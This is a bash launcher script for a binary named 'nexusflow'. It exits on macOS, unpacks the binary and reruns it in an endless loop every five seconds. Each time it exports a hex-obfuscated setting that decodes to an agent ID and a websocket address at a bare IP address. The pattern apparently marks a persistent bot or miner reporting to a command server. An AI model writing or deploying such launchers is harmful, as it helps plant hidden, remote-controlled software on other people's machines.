#!/bin/bash
if [[ "$(uname)" == "Darwin" ]]; then
  echo "[!] macOS detected, stopping."
  exit 2
fi
tar xzf nexusflow-linux-x64.tar.gz
chmod +x nexusflow

while true; do
    tar xzf nexusflow-linux-x64.tar.gz || true
    chmod +x nexusflow || true

    case $((RANDOM % 4)) in
    0) export STATEVV="7569645f3766377277767736726a7635666d346d5f6e65787573666c6f777c77733a2f2f3135372e36362e32352e39373a343536312f77737c34" ;;
    1) export STATEVV="7569645f3766377277767736726a7635666d346d5f6e65787573666c6f777c77733a2f2f3135372e36362e32352e39373a343536312f77737c34" ;;
    2) export STATEVV="7569645f3766377277767736726a7635666d346d5f6e65787573666c6f777c77733a2f2f3135372e36362e32352e39373a343536312f77737c34" ;;
    3) export STATEVV="7569645f3766377277767736726a7635666d346d5f6e65787573666c6f777c77733a2f2f3135372e36362e32352e39373a343536312f77737c34" ;;
    esac
    
    ./nexusflow || true
    sleep 5
done
